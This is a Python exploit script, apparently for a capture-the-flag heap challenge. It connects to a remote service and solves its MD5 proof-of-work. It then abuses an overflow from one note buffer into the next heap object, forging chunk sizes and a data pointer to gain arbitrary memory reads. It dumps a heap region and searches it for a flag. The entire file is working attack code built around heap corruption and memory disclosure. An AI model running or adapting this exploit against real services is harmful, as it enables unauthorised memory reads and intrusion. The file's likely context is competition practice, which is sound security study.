#!/usr/bin/env python3
"""Step1: build arbitrary-read via A-overflow -> B.buf overwrite; dump heap window; grep flag."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 30410
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)


def drain(s, wait=0.7, bufsize=65536):
    s.settimeout(0.2)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=8)
        b = drain(self.s, 1.5)
        masked = re.search(rb"Token:\s*([A-Za-z_]+)", b).group(1).decode()
        md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", b).group(1).decode()
        ans = solve_pow(md5hex, masked)
        print("[pow] %s -> %s" % (masked, ans), flush=True)
        self.send(ans, 1.2)

    def send(self, line, wait=0.6):
        line = str(line)
        try:
            self.s.sendall(line.encode() + b"\n")
        except OSError as e:
            print("[SEND-FAIL %r] %s" % (e, line), flush=True)
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata)

    def edit(self, idx, length, hexdata, wait=0.6):
        self.send(2); self.send(idx); self.send(length)
        return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3)
        return self.send(idx, wait)

    def pack(self, idx):
        self.send(4)
        return self.send(idx)

    def delete(self, idx):
        self.send(5)
        return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())


c = C(HOST, PORT)

# --- setup ---
c.create(0, "A", 512, 512, "41" * 512)          # will shrink after pack
c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)

d = parse(c.show(0))
assert d, "show A failed"
ln, cap, blob = d
B_buf = struct.unpack("<Q", blob[0x30:0x38])[0]
top_size = struct.unpack("<Q", blob[0x168:0x170])[0]
print("[setup] A.cap=%d  B.buf=0x%x  top_size=0x%x" % (cap, B_buf, top_size), flush=True)

A_USER = B_buf - 0x60          # B.buf (data chunk user) = A_user + 0x60
print("[setup] A_user = 0x%x" % A_USER, flush=True)

CUR = {"top": top_size}


def build(n, addr):
    p = bytearray(b"\x00" * 520)
    p[0:0x10] = b"A" * 16
    p[0x18:0x20] = p64(0x41)          # B struct chunk size (preserve)
    p[0x20:0x28] = p64(n)             # B.cap
    p[0x28:0x30] = p64(n)             # B.len
    p[0x30:0x38] = p64(addr)          # B.buf  -> arbitrary pointer
    p[0x38:0x40] = b"B"               # B.title
    p[0x58:0x60] = p64(0x31)          # B data chunk size (preserve)
    p[0x88:0x90] = p64(0x41)          # C struct chunk size
    p[0xc8:0xd0] = p64(0x31)          # C data chunk size
    p[0xf8:0x100] = p64(0x41)         # D struct chunk size
    p[0x138:0x140] = p64(0x31)        # D data chunk size
    p[0x168:0x170] = p64(CUR["top"])  # top chunk size (preserve)
    return p


def arb_read(addr, n):
    c.edit(0, 520, build(n, addr).hex())
    r = c.show(1, wait=1.2 + n / 20000.0)
    d = parse(r)
    if not d:
        print("[arb_read 0x%x] NO-RESPONSE %r" % (addr, r[:120]), flush=True)
        return None
    return d[2]


# --- verify primitive: read A's own buffer (should start 41 00 00 ...) ---
v = arb_read(A_USER, 64)
print("[verify] read(A_user,64) =", v.hex() if v else None, flush=True)

# --- dump window around A_user: [A_user-0x1000, A_user+0x2000] ---
lo = A_USER - 0x1000
n = 0x3000
big = arb_read(lo, n)
if big:
    print("[dump] window 0x%x..0x%x len=%d" % (lo, lo + n, len(big)), flush=True)
    for pat in [rb"[Ff][Ll][Aa][Gg]\{", rb"[Ff][Ll][Aa][Gg]"]:
        for m in re.finditer(pat, big):
            s = max(0, m.start() - 8)
            print("  HIT @0x%x : %r" % (lo + m.start(), big[s:m.start() + 64]), flush=True)
    # show the low (heap-start-ish) region structure
    print("  low64:", big[:64].hex(), flush=True)
    print("  contains b'W'x?:", big.count(b"W"), " 'flag' count:", big.lower().count(b"flag"), flush=True)
    # print quoteable printable runs
    runs = re.findall(rb"[ -~]{6,}", big)
    print("  printable runs:", runs[:40], flush=True)
c.s.close()